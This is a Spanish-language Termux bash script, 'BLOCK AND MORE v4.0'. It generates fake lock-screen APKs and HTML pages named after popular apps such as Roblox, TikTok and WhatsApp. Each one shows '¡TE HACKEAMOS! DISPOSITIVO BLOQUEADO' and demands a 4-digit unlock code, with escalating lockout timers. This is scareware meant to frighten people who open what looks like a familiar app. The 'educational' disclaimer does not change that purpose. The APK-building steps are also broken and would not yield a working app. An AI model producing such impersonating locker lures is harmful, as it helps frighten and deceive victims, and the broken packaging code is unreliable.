#!/data/data/com.termux/files/usr/bin/bash

CYAN='\033[0;36m'
AMARILLO='\033[1;33m'
VERDE='\033[0;32m'
BLANCO='\033[1;37m'
ROJO='\033[0;31m'
NC='\033[0m'

clear

echo -e "${CYAN}"
echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
echo -e "${AMARILLO}        [ BLOCK AND MORE v4.0 ]${NC}\n"

# ============================================
# LISTA DE APPS
# ============================================
APPS=(
    "Roblox" "Free Fire" "TikTok" "Instagram"
    "Facebook" "WhatsApp" "YouTube" "Minecraft"
    "PUBG Mobile" "Clash of Clans" "Spotify" "Netflix"
)

# ============================================
# FUNCIÓN: MOSTRAR MENÚ
# ============================================
mostrar_menu() {
    echo -e "${BLANCO}[+] Selecciona una app para generar su BLOCK APK:${NC}\n"
    for i in "${!APPS[@]}"; do
        num=$((i+1))
        printf " ${AMARILLO}[%02d]${NC} ${VERDE}%-13s${NC}" "$num" "${APPS[$i]}"
        if [ $((num % 4)) -eq 0 ]; then
            echo ""
        fi
    done
    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================
# FUNCIÓN: GENERAR HTML WEB (ALTERNATIVA)
# ============================================
generar_html_block() {
    local app="$1"
    local codigo="$2"
    
    mkdir -p ~/storage/downloads/block_pages
    
    cat > ~/storage/downloads/block_pages/${app}_block.html << EOF
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🔒 $app - BLOQUEADO</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    font-family:Arial,sans-serif;
    background:#CC0000;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    overflow:hidden;
}
.container{
    background:#FF0000;
    padding:40px;
    border-radius:20px;
    width:400px;
    text-align:center;
    border:5px solid #FFFFFF;
    box-shadow:0 0 50px rgba(255,0,0,0.8);
    animation: pulse 1s infinite;
}
@keyframes pulse{
    0%{box-shadow:0 0 50px rgba(255,0,0,0.8);}
    50%{box-shadow:0 0 100px rgba(255,0,0,0.4);}
    100%{box-shadow:0 0 50px rgba(255,0,0,0.8);}
}
.icono{font-size:80px;margin-bottom:10px}
h1{
    color:#FFFFFF;
    font-size:32px;
    font-weight:bold;
    text-shadow:0 0 20px rgba(255,255,255,0.3);
}
.subtitle{
    color:#FFFF00;
    font-size:16px;
    margin:10px 0 20px 0;
}
.mensaje{
    color:#FFFFFF;
    font-size:14px;
    margin-bottom:20px;
}
input{
    width:100%;
    padding:15px;
    font-size:20px;
    border:none;
    border-radius:10px;
    text-align:center;
    letter-spacing:5px;
    background:#FFFFFF;
    color:#000000;
    margin-bottom:15px;
}
input:focus{outline:2px solid #FFFF00}
.btn{
    width:100%;
    padding:15px;
    font-size:18px;
    font-weight:bold;
    border:none;
    border-radius:10px;
    background:#FF0000;
    color:#FFFFFF;
    cursor:pointer;
    border:2px solid #FFFFFF;
    transition:all 0.3s;
}
.btn:hover{
    background:#CC0000;
    transform:scale(1.02);
}
.error{
    color:#FFFF00;
    font-size:14px;
    margin-top:10px;
    min-height:25px;
}
.timer{
    color:#FFFFFF;
    font-size:16px;
    margin-top:5px;
}
.footer{
    color:rgba(255,255,255,0.5);
    font-size:11px;
    margin-top:20px;
}
</style>
</head>
<body>
<div class="container">
    <div class="icono">⚠️</div>
    <h1>¡TE HACKEAMOS!</h1>
    <div class="subtitle">🔒 DISPOSITIVO BLOQUEADO 🔒</div>
    <div class="mensaje">Ingresa el código de 4 dígitos para desbloquear</div>
    <input type="password" id="codigo" maxlength="4" placeholder="CÓDIGO" inputmode="numeric">
    <button class="btn" onclick="verificar()">🔓 DESBLOQUEAR</button>
    <div class="error" id="error"></div>
    <div class="timer" id="timer"></div>
    <div class="footer">⚠️ Sitio de demostración</div>
</div>
<script>
const CODIGO_CORRECTO = "$codigo";
let intentos = 0;
let bloqueado = false;
let tiempoEspera = 0;
let timerInterval = null;

function verificar() {
    if (bloqueado) {
        document.getElementById('error').textContent = '⏳ Espera ' + tiempoEspera + ' segundos';
        return;
    }
    
    const codigo = document.getElementById('codigo').value;
    
    if (codigo === '') {
        document.getElementById('error').textContent = '❌ Ingresa el código';
        return;
    }
    
    if (codigo === CODIGO_CORRECTO) {
        document.getElementById('error').textContent = '✅ ¡CÓDIGO CORRECTO!';
        document.getElementById('error').style.color = '#00FF00';
        document.querySelector('.container').style.borderColor = '#00FF00';
        document.querySelector('.container').style.animation = 'none';
        setTimeout(() => {
            document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#fff;font-family:Arial;background:#1a1a1a;min-height:100vh;display:flex;justify-content:center;align-items:center;flex-direction:column;"><h1 style="color:#00FF00;">✅ DESBLOQUEADO</h1><p style="color:#fff;font-size:18px;">El dispositivo ha sido desbloqueado</p></div>';
        }, 1500);
    } else {
        intentos++;
        tiempoEspera = intentos * 60;
        document.getElementById('error').textContent = '❌ CÓDIGO INCORRECTO. Espera ' + tiempoEspera + 's';
        document.getElementById('error').style.color = '#FFFF00';
        document.getElementById('codigo').value = '';
        document.getElementById('codigo').focus();
        bloqueado = true;
        iniciarTemporizador();
    }
}

function iniciarTemporizador() {
    let tiempo = tiempoEspera;
    document.getElementById('timer').textContent = '⏳ ' + tiempo + 's';
    
    if (timerInterval) clearInterval(timerInterval);
    
    timerInterval = setInterval(() => {
        tiempo--;
        document.getElementById('timer').textContent = '⏳ ' + tiempo + 's';
        
        if (tiempo <= 0) {
            clearInterval(timerInterval);
            bloqueado = false;
            document.getElementById('timer').textContent = '';
            document.getElementById('error').textContent = '✅ Puedes intentar de nuevo';
            document.getElementById('error').style.color = '#00FF00';
        }
    }, 1000);
}

document.getElementById('codigo').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') verificar();
});
</script>
</body>
</html>
EOF

    echo -e "${VERDE}[✔] HTML generado en: ~/storage/downloads/block_pages/${app}_block.html${NC}"
}

# ============================================
# FUNCIÓN: GENERAR APK SIMPLE
# ============================================
generar_apk_simple() {
    local app="$1"
    local codigo="$2"
    
    echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
    echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}"
    echo -e "${AMARILLO}[*] Creando APK simple...${NC}\n"
    
    mkdir -p ~/block_temp
    cd ~/block_temp
    
    # Crear estructura básica de APK
    mkdir -p META-INF
    mkdir -p res/drawable
    mkdir -p res/layout
    mkdir -p res/values
    mkdir -p AndroidManifest.xml
    
    # 1. AndroidManifest.xml
    cat > AndroidManifest.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.block.$app"
    android:versionCode="1"
    android:versionName="1.0">
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="$app"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleInstance"
            android:showOnLockScreen="true"
            android:turnScreenOn="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF
    
    # 2. Layout
    cat > res/layout/main.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:background="#CC0000"
    android:padding="20dp">
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="⚠️"
        android:textSize="70sp" />
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="¡TE HACKEAMOS!"
        android:textColor="#FFFFFF"
        android:textSize="32sp"
        android:textStyle="bold"
        android:layout_marginTop="10dp" />
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="🔒 DISPOSITIVO BLOQUEADO"
        android:textColor="#FFFF00"
        android:textSize="18sp"
        android:layout_marginTop="5dp" />
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Ingresa el código de 4 dígitos"
        android:textColor="#FFFFFF"
        android:textSize="14sp"
        android:layout_marginTop="20dp"
        android:layout_marginBottom="20dp" />
    
    <EditText
        android:id="@+id/codigo"
        android:layout_width="200dp"
        android:layout_height="50dp"
        android:background="#FFFFFF"
        android:textColor="#000000"
        android:textSize="24sp"
        android:gravity="center"
        android:inputType="number"
        android:maxLength="4" />
    
    <Button
        android:id="@+id/desbloquear"
        android:layout_width="200dp"
        android:layout_height="50dp"
        android:text="🔓 DESBLOQUEAR"
        android:textColor="#FFFFFF"
        android:textSize="16sp"
        android:textStyle="bold"
        android:background="#FF0000"
        android:layout_marginTop="15dp" />
    
    <TextView
        android:id="@+id/error"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text=""
        android:textColor="#FFFF00"
        android:textSize="14sp"
        android:layout_marginTop="10dp" />
        
    <TextView
        android:id="@+id/timer"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text=""
        android:textColor="#FFFFFF"
        android:textSize="14sp"
        android:layout_marginTop="5dp" />
        
</LinearLayout>
EOF
    
    # 3. Strings
    cat > res/values/strings.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">$app</string>
</resources>
EOF
    
    # 4. Icono simple (1x1 pixel)
    echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
    
    # 5. Crear MANIFEST.MF
    cat > META-INF/MANIFEST.MF << EOF
Manifest-Version: 1.0
Created-By: BlockAndMore
EOF
    
    # 6. Crear ZIP (APK)
    echo -e "${AMARILLO}[*] Empaquetando APK...${NC}"
    zip -r "${app}_block.apk" AndroidManifest.xml res/ META-INF/ 2>/dev/null
    
    if [ -f "${app}_block.apk" ]; then
        mv "${app}_block.apk" ~/storage/downloads/
        cd ~
        rm -rf ~/block_temp
        
        clear
        echo -e "${CYAN}==================================================${NC}"
        echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
        echo -e "${CYAN}==================================================${NC}\n"
        echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
        echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
        echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
        echo -e "\n${ROJO}⚠️  NOTA:${NC} Esta APK es una versión SIMPLE"
        echo -e "${AMARILLO}[!] Si no funciona, usa la versión HTML (también generada)${NC}"
        echo -e "\n${BLANCO}[*] También se generó una página HTML:${NC}"
        echo -e "${AMARILLO}   ~/storage/downloads/block_pages/${app}_block.html${NC}"
        echo -e "${BLANCO}[*] Puedes abrirla en cualquier navegador${NC}"
        echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
        echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    else
        echo -e "${ROJO}[!] Error al generar APK. Generando HTML en su lugar...${NC}"
        cd ~
        rm -rf ~/block_temp
        generar_html_block "$app" "$codigo"
        
        echo -e "\n${VERDE}[✔] Página HTML generada:${NC}"
        echo -e "${AMARILLO}   ~/storage/downloads/block_pages/${app}_block.html${NC}"
        echo -e "${BLANCO}[*] Abre este archivo en cualquier navegador${NC}"
    fi
}

# ============================================
# MENÚ PRINCIPAL
# ============================================
while true; do
    clear
    echo -e "${CYAN}"
    echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
    echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
    echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
    echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
    echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
    echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
    echo -e "${AMARILLO}        [ BLOCK AND MORE v4.0 ]${NC}\n"
    
    mostrar_menu
    read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
    
    if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
        APP_SELECCIONADA="${APPS[$((opcion-1))]}"
        
        echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos para el bloqueo:${NC}"
        while true; do
            read -p ">> Código (1000-9999): " CODIGO < /dev/tty
            if [[ "$CODIGO" =~ ^[0-9]{4}$ ]] && [ "$CODIGO" -ge 1000 ] && [ "$CODIGO" -le 9999 ]; then
                break
            else
                echo -e "${ROJO}[!] Código inválido. Debe ser de 4 dígitos (1000-9999).${NC}"
            fi
        done
        
        generar_apk_simple "$APP_SELECCIONADA" "$CODIGO"
        read -p "Presiona Enter para continuar..."
    else
        echo -e "${ROJO}[!] Opción inválida. Elige un número del 01 al ${#APPS[@]}.${NC}"
        sleep 2
    fi
done
